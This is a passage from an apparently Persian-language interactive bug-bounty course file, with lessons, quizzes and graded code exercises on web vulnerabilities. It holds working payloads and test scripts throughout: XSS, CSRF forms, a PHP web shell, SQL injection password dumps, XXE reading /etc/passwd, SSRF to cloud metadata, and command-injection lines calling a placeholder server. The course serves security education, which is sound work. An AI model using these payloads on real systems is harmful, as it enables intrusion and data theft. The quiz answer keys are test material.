            { type: "quiz", title: "innerHTML چرا خطرناکه؟", options: ["کنده", "HTML رو parse و اجرا می‌کنه (شامل script)", "فقط text میذاره", "خطرناک نیست"], correct: 1 },
            { type: "code", title: "XSS payload بنویس!", instruction: "یه payload بنویس که از تگ <code>img</code> با <code>onerror</code> استفاده کنه.", answer: '<img src=x onerror=alert(document.cookie)>', validate: function(code) { return code.includes('img') && code.includes('onerror'); } }
        ]
    },
    {
        id: 42,
        title: "باگ‌بانتی: CSRF و CORS",
        icon: "🔓",
        steps: [
            { type: "teach", title: "CSRF چیست؟", content: `<p>Cross-Site Request Forgery: مجبور کردن کاربر به ارسال درخواست ناخواسته:</p><pre><code>// سناریو: کاربر لاگین سایت بانکه
// مهاجم این صفحه رو می‌سازه:

<form action="https://bank.com/transfer" method="POST" id="f">
    <input type="hidden" name="to" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
<script>document.getElementById('f').submit();</script>

// یا با fetch (اگه CORS اجازه بده):
fetch('https://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include', // کوکی‌ها ارسال میشن!
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ to: 'hacker', amount: 1000000 })
});

// تست CSRF:
// 1. درخواست‌های state-changing (POST/PUT/DELETE) رو پیدا کن
// 2. ببین CSRF token دارن یا نه
// 3. ببین SameSite cookie ست شده یا نه</code></pre>` },
            { type: "quiz", title: "CSRF چطور کار می‌کنه؟", options: ["رمز رو می‌دزده", "از session فعال قربانی سوءاستفاده می‌کنه", "سرور رو هک می‌کنه", "DNS رو تغییر میده"], correct: 1 },
            { type: "teach", title: "CORS Misconfiguration", content: `<pre><code>// CORS: مرورگر اجازه نمیده از دامنه دیگه request بزنی
// مگه سرور اجازه بده

// تست CORS misconfiguration:
// 1. Origin header رو تغییر بده
fetch('https://target.com/api/user', {
    headers: { 'Origin': 'https://evil.com' },
    credentials: 'include'
});

// اگه response این header رو داشته باشه = آسیب‌پذیر:
// Access-Control-Allow-Origin: https://evil.com
// Access-Control-Allow-Credentials: true

// اسکریپت تست:
async function testCORS(url) {
    const origins = [
        'https://evil.com',
        'null',
        'https://target.com.evil.com',
        'https://eviltarget.com'
    ];
    
    for (const origin of origins) {
        const res = await fetch(url, {
            headers: { 'Origin': origin }
        });
        const acao = res.headers.get('Access-Control-Allow-Origin');
        if (acao === origin || acao === '*') {
            console.log('[!] CORS misconfigured for:', origin);
        }
    }
}</code></pre>` },
            { type: "quiz", title: "Access-Control-Allow-Origin: * با credentials: true خطرناکه؟", options: ["نه مشکلی نداره", "بله، هر سایتی می‌تونه داده بخونه", "مرورگر اجازه نمیده", "فقط GET"], correct: 2 },
            { type: "code", title: "CORS تست کن!", instruction: "یه fetch بنویس که با <code>credentials: 'include'</code> به یه URL درخواست بزنه.", answer: "fetch('https://target.com/api', { credentials: 'include' });", validate: function(code) { return code.includes('fetch') && code.includes('credentials') && code.includes('include'); } }
        ]
    },
    {
        id: 43,
        title: "باگ‌بانتی: IDOR و Auth Bypass",
        icon: "🚪",
        steps: [
            { type: "teach", title: "IDOR چیست؟", content: `<p>Insecure Direct Object Reference: دسترسی به داده‌های دیگران با تغییر ID:</p><pre><code>// سناریو: پروفایل کاربر
// GET /api/users/123/profile → پروفایل خودت
// GET /api/users/124/profile → پروفایل یکی دیگه! 🐛

// تست IDOR:
async function testIDOR(baseUrl, yourId, targetId) {
    // 1. درخواست عادی خودت
    const myRes = await fetch(baseUrl + '/' + yourId, {
        headers: { 'Authorization': 'Bearer YOUR_TOKEN' }
    });
    
    // 2. تغییر ID به کاربر دیگه
    const otherRes = await fetch(baseUrl + '/' + targetId, {
        headers: { 'Authorization': 'Bearer YOUR_TOKEN' }
    });
    
    if (otherRes.status === 200) {
        console.log('[!] IDOR found! Can access other user data');
    }
}

// جاهایی که IDOR پیدا میشه:
// /api/orders/ORDER_ID
// /api/files/FILE_ID
// /api/messages/MSG_ID
// /download?file=invoice_123.pdf</code></pre>` },
            { type: "quiz", title: "IDOR یعنی چی؟", options: ["SQL Injection", "دسترسی به resource دیگران با تغییر شناسه", "XSS", "brute force password"], correct: 1 },
            { type: "teach", title: "Authentication Bypass", content: `<pre><code>// تکنیک‌های bypass auth:

// 1. JWT manipulation
// Header: {"alg":"none"} → امضا رو حذف کن
// یا alg رو از RS256 به HS256 عوض کن

// 2. Parameter pollution
// POST /login?role=user&role=admin

// 3. Path traversal در auth
// /admin → 403
// /Admin → 200?
// /admin/ → 200?
// /./admin → 200?
// /%61dmin → 200?

// 4. تست Rate limiting
async function bruteForce(url, username, passwords) {
    for (const pass of passwords) {
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password: pass })
        });
        const data = await res.json();
        if (res.status === 200) {
            console.log('[!] Found:', pass);
            break;
        }
        // اگه rate limit نخورد = باگ!
    }
}

// 5. Password reset flow
// آیا token قابل حدس زدنه؟
// آیا token expire میشه؟
// آیا می‌تونی email دیگران رو بدی؟</code></pre>` },
            { type: "quiz", title: "JWT با alg:none یعنی چی؟", options: ["امن‌ترین", "بدون امضا - هرکسی می‌تونه جعل کنه", "فقط read", "expire نمیشه"], correct: 1 },
            { type: "code", title: "IDOR تست کن!", instruction: "یه اسکریپت بنویس که IDهای 1 تا 100 رو تست کنه و ببینه به کدوم دسترسی داره.", answer: 'for (let i=1; i<=100; i++) { fetch("/api/users/"+i, {headers:{"Authorization":"Bearer token"}}).then(r => { if(r.ok) console.log("Access:",i); }); }', validate: function(code) { return code.includes('for') && code.includes('fetch') && code.includes('/api/'); } }
        ]
    },
    {
        id: 44,
        title: "باگ‌بانتی: SSRF و Injection",
        icon: "🎯",
        steps: [
            { type: "teach", title: "SSRF", content: `<p>Server-Side Request Forgery: مجبور کردن سرور به ارسال درخواست به جای ما:</p><pre><code>// سناریو: سایت URL می‌گیره و preview نشون میده
// POST /api/preview { "url": "https://example.com" }

// حمله: به سرویس‌های داخلی دسترسی بگیر
// { "url": "http://localhost:3000/admin" }
// { "url": "http://169.254.169.254/latest/meta-data/" } // AWS metadata
// { "url": "http://127.0.0.1:6379/" } // Redis

// تست SSRF:
const ssrfPayloads = [
    'http://localhost',
    'http://127.0.0.1',
    'http://[::1]',
    'http://0.0.0.0',
    'http://169.254.169.254',  // AWS
    'http://metadata.google.internal', // GCP
    'http://localhost:6379',   // Redis
    'http://localhost:27017',  // MongoDB
    'file:///etc/passwd',
];

async function testSSRF(endpoint) {
    for (const payload of ssrfPayloads) {
        const res = await fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ url: payload })
        });
        const body = await res.text();
        console.log(payload, '->', res.status, body.substring(0, 100));
    }
}</code></pre>` },
            { type: "quiz", title: "SSRF چه خطری داره؟", options: ["XSS", "دسترسی به سرویس‌های داخلی شبکه", "حذف فایل", "DDoS"], correct: 1 },
            { type: "teach", title: "Command Injection", content: `<pre><code>// وقتی ورودی کاربر در shell command استفاده میشه
// مثال آسیب‌پذیر:
// app.get('/ping', (req, res) => {
//     exec('ping ' + req.query.host, callback);
// });

// حمله:
// /ping?host=google.com;cat /etc/passwd
// /ping?host=google.com|ls
// /ping?host=$(whoami)

// Payloadهای تست:
const cmdPayloads = [
    '; ls',
    '| cat /etc/passwd',
    '$(whoami)',
    '\`id\`',
    '; sleep 5',  // time-based detection
    '|| curl http://your-server.com',
];

// NoSQL Injection (MongoDB):
// POST /login
// { "username": {"$ne": ""}, "password": {"$ne": ""} }
// → login بدون رمز!

// { "username": "admin", "password": {"$gt": ""} }
// → password بزرگتر از خالی = همیشه true</code></pre>` },
            { type: "quiz", title: "NoSQL injection { $ne: '' } چیکار می‌کنه؟", options: ["خطا میده", "همه رکوردها رو برمی‌گردونه (not equal empty)", "DB رو حذف می‌کنه", "کاری نمی‌کنه"], correct: 1 },
            { type: "code", title: "SSRF payload بنویس!", instruction: "یه fetch بنویس که URL رو به endpoint بفرسته و AWS metadata رو تست کنه.", answer: 'fetch("/api/preview", { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({url:"http://169.254.169.254/latest/meta-data/"}) });', validate: function(code) { return code.includes('169.254.169.254') && code.includes('fetch'); } }
        ]
    },
    {
        id: 45,
        title: "باگ‌بانتی: Recon و ابزارها",
        icon: "🔭",
        steps: [
            { type: "teach", title: "Reconnaissance", content: `<p>اولین قدم باگ‌بانتی: جمع‌آوری اطلاعات:</p><pre><code>// Subdomain enumeration (با JS)
async function findSubdomains(domain) {
    // 1. crt.sh - Certificate Transparency
    const res = await fetch(
        'https://crt.sh/?q=%25.' + domain + '&output=json'
    );
    const certs = await res.json();
    const subs = [...new Set(
        certs.map(c => c.name_value).flat()
    )];
    return subs;
}

// 2. بررسی status هر subdomain
async function checkAlive(subdomains) {
    const alive = [];
    for (const sub of subdomains) {
        try {
            const res = await fetch('https://' + sub, {
                signal: AbortSignal.timeout(5000)
            });
            alive.push({ sub, status: res.status });
        } catch(e) {}
    }
    return alive;
}

// 3. Technology detection
// بررسی headerها:
// X-Powered-By, Server, X-AspNet-Version
// بررسی HTML: meta generator, script src
// بررسی cookies: PHPSESSID, JSESSIONID, connect.sid</code></pre>` },
            { type: "quiz", title: "crt.sh چی نشون میده؟", options: ["DNS records", "SSL certificate ها و subdomain ها", "پورت‌های باز", "آسیب‌پذیری‌ها"], correct: 1 },
            { type: "teach", title: "JS Recon و Endpoint Discovery", content: `<pre><code>// استخراج endpoint از فایل‌های JS سایت
async function extractEndpoints(jsUrl) {
    const res = await fetch(jsUrl);
    const code = await res.text();
    
    // پیدا کردن URL و path
    const urlRegex = /["'](\/api\/[^"']+)["']/g;
    const endpoints = [];
    let match;
    while ((match = urlRegex.exec(code)) !== null) {
        endpoints.push(match[1]);
    }
    return [...new Set(endpoints)];
}

// پیدا کردن فایل‌های JS صفحه
function getPageScripts() {
    return [...document.querySelectorAll('script[src]')]
        .map(s => s.src);
}

// پیدا کردن API keys لو رفته
function findSecrets(jsCode) {
    const patterns = {
        'AWS Key': /AKIA[0-9A-Z]{16}/,
        'Google API': /AIza[0-9A-Za-z\\-_]{35}/,
        'JWT': /eyJ[A-Za-z0-9-_]+\\.eyJ[A-Za-z0-9-_]+/,
        'Private Key': /-----BEGIN (RSA )?PRIVATE KEY-----/,
    };
    
    for (const [name, regex] of Object.entries(patterns)) {
        const match = jsCode.match(regex);
        if (match) console.log('[!]', name, ':', match[0]);
    }
}</code></pre>` },
            { type: "quiz", title: "چرا فایل‌های JS سایت رو بررسی می‌کنیم؟", options: ["برای XSS", "endpoint ها و secret های لو رفته", "سرعت سایت", "SEO"], correct: 1 },
            { type: "code", title: "Endpoint extractor بنویس!", instruction: "یه regex بنویس که pathهای <code>/api/...</code> رو از کد JS استخراج کنه.", answer: 'const regex = /["\'](\\\/api\\\/[^"\']+)["\']/g;', validate: function(code) { return code.includes('api') && code.includes('regex') || code.includes('/api/'); } }
        ]
    },
    {
        id: 46,
        title: "باگ‌بانتی: گزارش‌نویسی",
        icon: "📋",
        steps: [
            { type: "teach", title: "ساختار گزارش", content: `<p>گزارش خوب = bounty بیشتر:</p><pre><code>// ساختار استاندارد گزارش HackerOne:

// ## Title
// IDOR in /api/users allows accessing other users' data

// ## Summary
// توضیح کوتاه آسیب‌پذیری

// ## Steps to Reproduce
// 1. Login as user A
// 2. Send GET /api/users/123 (your profile)
// 3. Change 123 to 124
// 4. You can see user B's private data

// ## Impact
// An attacker can access any user's personal data
// including email, phone, address

// ## Severity
// High (CVSS 7.5) - Confidentiality breach

// ## Proof of Concept
// [Screenshot/Video]
// [HTTP Request/Response]

// ## Remediation
// Add authorization check:
// if (req.user.id !== req.params.id) return 403;</code></pre>` },
            { type: "quiz", title: "مهم‌ترین بخش گزارش چیه؟", options: ["Title", "Steps to Reproduce (قابل تکرار بودن)", "Severity", "Remediation"], correct: 1 },
            { type: "teach", title: "PoC نویسی", content: `<pre><code>// Proof of Concept باید ساده و قابل اجرا باشه

// مثال PoC برای XSS:
// URL: https://target.com/search?q=<script>alert(document.domain)</script>

// مثال PoC برای CSRF:
const csrfPoc = \`
<html>
<body>
<h1>Click here for free prize!</h1>
<form id="csrf" action="https://target.com/api/email" method="POST">
    <input type="hidden" name="email" value="hacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>\`;

// مثال PoC برای SSRF (با Burp Collaborator):
const ssrfPoc = {
    method: 'POST',
    url: '/api/webhook',
    body: { url: 'http://your-collaborator-url.burpcollaborator.net' }
};

// نکات:
// - از alert(document.domain) استفاده کن نه alert(1)
// - Impact واقعی رو نشون بده (cookie theft, account takeover)
// - Video بگیر اگه پیچیده‌ست</code></pre>` },
            { type: "quiz", title: "چرا alert(document.domain) بهتر از alert(1) ه؟", options: ["قشنگ‌تره", "ثابت می‌کنه JS روی دامنه هدف اجرا شده", "سریع‌تره", "فرقی نداره"], correct: 1 },
            { type: "code", title: "گزارش بنویس!", instruction: "Title و Impact یه باگ IDOR رو بنویس.", answer: 'Title: IDOR allows accessing other users private data via /api/users/:id\nImpact: Attacker can read any user personal information', validate: function(code) { return code.includes('IDOR') && (code.includes('Impact') || code.includes('access')); } }
        ]
    },
    {
        id: 47,
        title: "باگ‌بانتی: SQL Injection",
        icon: "💀",
        steps: [
            { type: "teach", title: "SQL Injection چیست؟", content: `<p>تزریق کد SQL از طریق ورودی کاربر:</p><pre><code>// Backend آسیب‌پذیر:
// "SELECT * FROM users WHERE id = " + req.params.id

// حمله:
// /user?id=1 OR 1=1 -- → همه کاربران
// /user?id=1 UNION SELECT username,password FROM users --

// تشخیص:
// ' → خطای SQL = آسیب‌پذیر
// 1 AND 1=1 → عادی
// 1 AND 1=2 → متفاوت = آسیب‌پذیر

// انواع SQLi:
// 1. Error-based: خطا اطلاعات لو میده
// 2. Union-based: داده از جدول دیگه
// 3. Blind: true/false تفاوت
// 4. Time-based: sleep() برای تشخیص</code></pre>` },
            { type: "quiz", title: "' OR '1'='1 چیکار می‌کنه؟", options: ["خطا میده", "شرط رو همیشه true می‌کنه", "DB رو حذف می‌کنه", "کاری نمی‌کنه"], correct: 1 },
            { type: "teach", title: "Exploitation", content: `<pre><code>// Union-based SQLi:
// 1. تعداد ستون‌ها رو پیدا کن:
// /user?id=1 ORDER BY 1 -- (OK)
// /user?id=1 ORDER BY 5 -- (Error) → 4 ستون

// 2. ستون‌های قابل نمایش:
// /user?id=-1 UNION SELECT 1,2,3,4 --

// 3. استخراج اطلاعات:
// /user?id=-1 UNION SELECT 1,version(),3,4 --
// /user?id=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables --
// /user?id=-1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users' --
// /user?id=-1 UNION SELECT 1,username,password,4 FROM users --

// Time-based Blind:
// /user?id=1 AND SLEEP(5) -- → 5 ثانیه تاخیر = آسیب‌پذیر
// /user?id=1 AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0) --</code></pre>` },
            { type: "quiz", title: "UNION SELECT چیکار می‌کنه؟", options: ["جدول حذف می‌کنه", "نتیجه query دوم رو به اولی اضافه می‌کنه", "خطا میده", "فقط MySQL"], correct: 1 },
            { type: "code", title: "SQLi payload بنویس!", instruction: "یه UNION payload بنویس که username و password رو از جدول users بخونه.", answer: "-1 UNION SELECT username,password FROM users --", validate: function(code) { return code.includes('UNION') && code.includes('SELECT') && code.includes('users'); } }
        ]
    },
    {
        id: 48,
        title: "باگ‌بانتی: File Upload",
        icon: "📎",
        steps: [
            { type: "teach", title: "آسیب‌پذیری آپلود فایل", content: `<p>وقتی سایت فایل قبول می‌کنه، ممکنه بشه shell آپلود کرد:</p><pre><code>// تکنیک‌های bypass:

// 1. تغییر extension:
// shell.php → shell.php.jpg
// shell.php → shell.pHp
// shell.php → shell.php%00.jpg (null byte)
// shell.php → shell.php;.jpg

// 2. تغییر Content-Type:
// Content-Type: image/jpeg (ولی فایل PHP ه)

// 3. Magic bytes:
// اول فایل PHP رو GIF89a بذار:
// GIF89a<?php system($_GET['cmd']); ?>

// 4. Double extension:
// shell.php.jpg (اگه Apache با .htaccess)

// 5. SVG with XSS:
// <svg xmlns="http://www.w3.org/2000/svg">
//   <script>alert(document.domain)</script>
// </svg></code></pre>` },
            { type: "quiz", title: "چرا فقط چک extension کافی نیست؟", options: ["همیشه کافیه", "می‌شه با double extension یا null byte دور زد", "extension مهم نیست", "فقط Linux"], correct: 1 },
            { type: "teach", title: "تست آپلود با JS", content: `<pre><code>// اسکریپت تست file upload bypass:
async function testUpload(url, token) {
    const payloads = [
        { name: 'shell.php', type: 'image/jpeg', content: '<?php system($_GET["cmd"]); ?>' },
        { name: 'shell.php.jpg', type: 'image/jpeg', content: '<?php system($_GET["cmd"]); ?>' },
        { name: 'shell.phtml', type: 'image/jpeg', content: '<?php system($_GET["cmd"]); ?>' },
        { name: 'xss.svg', type: 'image/svg+xml', content: '<svg><script>alert(1)</script></svg>' },
        { name: 'xxe.svg', type: 'image/svg+xml', content: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>' },
    ];

    for (const p of payloads) {
        const form = new FormData();
        const blob = new Blob([p.content], { type: p.type });
        form.append('file', blob, p.name);

        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Authorization': 'Bearer ' + token },
            body: form
        });
        console.log(p.name, '->', res.status, await res.text());
    }
}</code></pre>` },
            { type: "quiz", title: "SVG file چه خطری داره؟", options: ["هیچ خطری نداره", "می‌تونه XSS و XXE داشته باشه", "فقط سنگینه", "سرور رو crash می‌کنه"], correct: 1 },
            { type: "code", title: "Upload bypass بنویس!", instruction: "یه FormData بساز که فایل PHP رو با Content-Type تصویر آپلود کنه.", answer: 'const form = new FormData(); form.append("file", new Blob(["<?php ?>"], {type:"image/jpeg"}), "shell.php.jpg");', validate: function(code) { return code.includes('FormData') && code.includes('append') && (code.includes('Blob') || code.includes('php')); } }
        ]
    },
    {
        id: 49,
        title: "باگ‌بانتی: XXE",
        icon: "📰",
        steps: [
            { type: "teach", title: "XXE چیست؟", content: `<p>XML External Entity: خواندن فایل سرور از طریق XML:</p><pre><code>// وقتی سایت XML قبول می‌کنه (API, file upload, SVG)

// Payload خواندن فایل:
const xxePayload = \`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>\`;

// SSRF via XXE:
const xxeSSRF = \`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>\`;

// Blind XXE (out-of-band):
const xxeOOB = \`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://your-server.com/?data=test">
]>
<root>&xxe;</root>\`;</code></pre>` },
            { type: "quiz", title: "XXE از چه طریقی فایل سرور رو می‌خونه؟", options: ["SQL query", "XML entity که به file:// اشاره می‌کنه", "JavaScript eval", "Path traversal"], correct: 1 },
            { type: "teach", title: "تست XXE", content: `<pre><code>// ارسال XXE payload:
async function testXXE(url) {
    const payloads = [
        // خواندن /etc/passwd
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>',
        // SSRF
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080">]><user><name>&xxe;</name></user>',
        // Windows
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><user><name>&xxe;</name></user>',
    ];

    for (const payload of payloads) {
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/xml' },
            body: payload
        });
        const body = await res.text();
        if (body.includes('root:') || body.includes('[fonts]')) {
            console.log('[!] XXE works!', body.substring(0, 200));
        }
    }
}

// جاهایی که XXE پیدا میشه:
// - API هایی که XML قبول می‌کنن
// - آپلود فایل DOCX, XLSX (اینا ZIP با XML هستن)
// - SVG upload
// - SOAP endpoints
// - RSS/Atom feeds</code></pre>` },
            { type: "quiz", title: "فایل DOCX چرا ممکنه XXE داشته باشه؟", options: ["باینری ه", "ZIP حاوی فایل‌های XML ه", "فقط متنه", "ربطی نداره"], correct: 1 },
            { type: "code", title: "XXE payload بنویس!", instruction: "یه XXE payload بنویس که <code>/etc/passwd</code> رو بخونه.", answer: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', validate: function(code) { return code.includes('DOCTYPE') && code.includes('ENTITY') && code.includes('SYSTEM') && code.includes('/etc/passwd'); } }
        ]
    },
    {
        id: 50,
        title: "باگ‌بانتی: Race Condition",
        icon: "🏎️",
        steps: [
            { type: "teach", title: "Race Condition چیست؟", content: `<p>وقتی چند درخواست همزمان باعث رفتار غیرمنتظره بشه:</p><pre><code>// سناریو: کد تخفیف یکبار مصرف
// اگه 10 درخواست همزمان بفرستی، ممکنه همه قبول بشن!

// سناریو: انتقال پول
// موجودی: 100
// 2 درخواست همزمان 100 تومن → هر دو موفق!
// نتیجه: 200 تومن خرج شد با 100 موجودی

// سناریو: لایک/vote
// 1 درخواست = 1 vote
// 50 درخواست همزمان = 50 vote!

// تست با Promise.all:
async function raceCondition(url, body, count = 50) {
    const requests = Array(count).fill().map(() =>
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer TOKEN'
            },
            body: JSON.stringify(body)
        })
    );
    
    const results = await Promise.all(requests);
    const success = results.filter(r => r.status === 200);
    console.log(\`[*] \${success.length}/\${count} succeeded\`);
    if (success.length > 1) {
        console.log('[!] Race condition found!');
    }
}</code></pre>` },
            { type: "quiz", title: "Race condition کجا خطرناکه؟", options: ["خواندن داده", "عملیات مالی و یکبار مصرف", "نمایش صفحه", "CSS"], correct: 1 },
            { type: "teach", title: "تکنیک‌های پیشرفته", content: `<pre><code>// Single-packet attack (HTTP/2):
// ارسال همه درخواست‌ها در یک packet TCP
// → رسیدن دقیقاً همزمان به سرور

// Last-byte sync:
// همه درخواست‌ها رو بفرست بجز آخرین byte
// بعد همه آخرین byte ها رو یکجا بفرست

// تست withdraw race condition:
async function testWithdrawRace(token) {
    const url = '/api/withdraw';
    const body = { amount: 100 };
    
    // ساخت 20 درخواست همزمان
    const promises = [];
    for (let i = 0; i < 20; i++) {
        promises.push(
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer ' + token
                },
                body: JSON.stringify(body)
            }).then(r => r.json())
        );
    }
    
    const results = await Promise.all(promises);
    const successes = results.filter(r => r.success);
    console.log('Successful withdrawals:', successes.length);
    // اگه بیشتر از 1 باشه = باگ!
}

// تست coupon race:
async function testCouponRace(couponCode, token) {
    const reqs = Array(10).fill().map(() =>
        fetch('/api/apply-coupon', {
            method: 'POST',
            headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' },
            body: JSON.stringify({ code: couponCode })
        }).then(r => ({ status: r.status, body: r.json() }))
    );
    return Promise.all(reqs);
}</code></pre>` },
            { type: "quiz", title: "Promise.all چرا برای تست race condition خوبه؟", options: ["سریع‌تره", "درخواست‌ها رو تقریباً همزمان می‌فرسته", "خطا نمیده", "فقط یه روشه"], correct: 1 },
            { type: "code", title: "Race condition تست کن!", instruction: "با Promise.all ده درخواست همزمان به <code>/api/redeem</code> بفرست.", answer: 'Promise.all(Array(10).fill().map(() => fetch("/api/redeem", {method:"POST"})));', validate: function(code) { return code.includes('Promise.all') && code.includes('fetch') && (code.includes('Array') || code.includes('map')); } }
        ]
    },
    {
        id: 51,
        title: "باگ‌بانتی: Business Logic",
        icon: "🧠",
        steps: [
            { type: "teach", title: "باگ‌های منطقی", content: `<p>باگ‌هایی که فنی نیستن ولی از منطق اشتباه سوءاستفاده می‌کنن:</p><pre><code>// 1. Price manipulation:
// POST /api/order { item: "laptop", price: 0.01 }
// اگه قیمت از client بیاد = باگ!

// 2. Negative quantity:
// POST /api/cart { item: "phone", quantity: -1 }
// ممکنه پول برگرده!

// 3. Coupon stacking:
// اعمال چند کد تخفیف روی هم
// 50% + 50% = رایگان!

// 4. Skip steps:
// مستقیم برو مرحله آخر بدون پرداخت
// POST /api/order/confirm بدون /api/order/pay

// 5. Role escalation:
// POST /api/register { role: "admin" }
// یا PUT /api/profile { role: "admin" }

// 6. Integer overflow:
// quantity: 999999999999 → overflow → عدد منفی

// تست:
async function testPriceManipulation(token) {
    const res = await fetch('/api/order', {
        method: 'POST',
        headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' },
        body: JSON.stringify({
            item_id: 1,
            quantity: 1,
            price: 0.01  // قیمت دستکاری شده
        })
    });
    console.log(await res.json());
}</code></pre>` },
            { type: "quiz", title: "چرا قیمت نباید از client بیاد؟", options: ["کنده", "کاربر می‌تونه دستکاری کنه", "مرورگر ساپورت نمی‌کنه", "فرقی نداره"], correct: 1 },
            { type: "teach", title: "تست‌های بیشتر", content: `<pre><code>// 7. Account takeover via password reset:
// - آیا token قابل حدس زدنه؟ (عدد ساده)
// - آیا می‌تونی email دیگران رو بدی؟
// - آیا token بعد استفاده expire میشه؟
// - Host header injection:
//   POST /reset-password
//   Host: evil.com ← لینک ریست به evil.com میره!

// 8. 2FA bypass:
// - مستقیم endpoint بعد 2FA رو صدا بزن
// - response manipulation (تغییر false به true)
// - brute force 4-digit code (10000 حالت)

// 9. Subscription bypass:
// - تغییر plan_id در request
// - دسترسی به endpoint premium بدون subscription

// اسکریپت تست parameter tampering:
async function testParamTampering(url, token) {
    const tests = [
        { role: 'admin' },
        { is_admin: true },
        { price: 0 },
        { discount: 100 },
        { quantity: -1 },
        { plan: 'enterprise' },
        { verified: true },
    ];
    
    for (const body of tests) {
        const res = await fetch(url, {
            method: 'PUT',
            headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        if (res.ok) {
            console.log('[!] Accepted:', body);
        }
    }
}</code></pre>` },
            { type: "quiz", title: "Host header injection در password reset چیکار می‌کنه؟", options: ["سرور رو هک می‌کنه", "لینک ریست رو به دامنه مهاجم می‌فرسته", "ایمیل رو عوض می‌کنه", "کاری نمی‌کنه"], correct: 1 },
            { type: "code", title: "Price tampering تست کن!", instruction: "یه request بنویس که قیمت محصول رو 0 بفرسته.", answer: 'fetch("/api/order", { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({item_id:1, price:0}) });', validate: function(code) { return code.includes('price') && code.includes('0') && code.includes('fetch'); } }
        ]
    },
    {
        id: 52,
        title: "باگ‌بانتی: Subdomain و Cloud",
        icon: "☁️",
        steps: [
            { type: "teach", title: "Cloud Misconfigurations", content: `<p>اشتباهات رایج در تنظیمات Cloud:</p><pre><code>// 1. S3 Bucket public:
// https://BUCKET.s3.amazonaws.com/
// اگه لیست فایل‌ها بیاد = misconfigured!

async function checkS3(bucketName) {
    const urls = [
        'https://' + bucketName + '.s3.amazonaws.com/',
        'https://s3.amazonaws.com/' + bucketName + '/',
    ];
    for (const url of urls) {
        const res = await fetch(url);
        if (res.ok) {
            const body = await res.text();
            if (body.includes('ListBucketResult')) {
                console.log('[!] Public S3:', url);
            }
        }
    }
}

// 2. Firebase misconfiguration:
// https://PROJECT.firebaseio.com/.json
// اگه داده برگرده = public!

// 3. .git exposed:
// https://target.com/.git/HEAD
// اگه "ref: refs/heads/main" برگرده = source code leak!

// 4. .env exposed:
// https://target.com/.env
// اگه DB_PASSWORD= برگرده = critical!

// 5. Backup files:
// /backup.sql, /db.sql, /dump.sql
// /config.php.bak, /web.config.old</code></pre>` },
            { type: "quiz", title: "S3 bucket public یعنی چی؟", options: ["سریع‌تره", "هرکسی بدون auth می‌تونه فایل‌ها رو ببینه", "فقط admin", "رایگانه"], correct: 1 },
            { type: "teach", title: "Sensitive File Discovery", content: `<pre><code>// اسکریپت پیدا کردن فایل‌های حساس:
async function findSensitiveFiles(baseUrl) {
    const paths = [
        '/.git/HEAD',
        '/.env',
        '/wp-config.php.bak',
        '/config.yml',
        '/.htpasswd',
        '/server-status',
        '/phpinfo.php',
        '/.DS_Store',
        '/backup.zip',
        '/database.sql',
        '/debug/vars',
        '/actuator/env',  // Spring Boot
        '/api/swagger.json',
        '/graphql',  // introspection
        '/.well-known/security.txt',
        '/robots.txt',
        '/sitemap.xml',
        '/crossdomain.xml',
    ];

    const found = [];
    for (const path of paths) {
        try {
            const res = await fetch(baseUrl + path, { redirect: 'manual' });
            if (res.status === 200) {
                const size = (await res.text()).length;
                if (size > 0) {
                    found.push({ path, status: res.status, size });
                    console.log('[+]', path, '- Size:', size);
                }
            }
        } catch(e) {}
    }
    return found;
}

// GraphQL introspection:
async function graphqlIntrospection(url) {
    const query = { query: '{ __schema { types { name fields { name } } } }' };
    const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(query)
    });
    return res.json();
}</code></pre>` },
            { type: "quiz", title: "/.git/HEAD چرا خطرناکه؟", options: ["ویروسه", "سورس‌کد کامل قابل دانلوده", "سرور crash می‌کنه", "فقط لینوکس"], correct: 1 },
            { type: "code", title: "Sensitive file finder بنویس!", instruction: "اسکریپتی بنویس که <code>/.env</code> و <code>/.git/HEAD</code> رو چک کنه.", answer: 'async function check(base) { for (const p of ["/.env","/.git/HEAD"]) { const r = await fetch(base+p); if(r.ok) console.log("Found:",p); } }', validate: function(code) { return code.includes('.env') && code.includes('.git') && code.includes('fetch'); } }
        ]
    },
    {
        id: 53,
        title: "باگ‌بانتی: WebSocket",
        icon: "🔌",
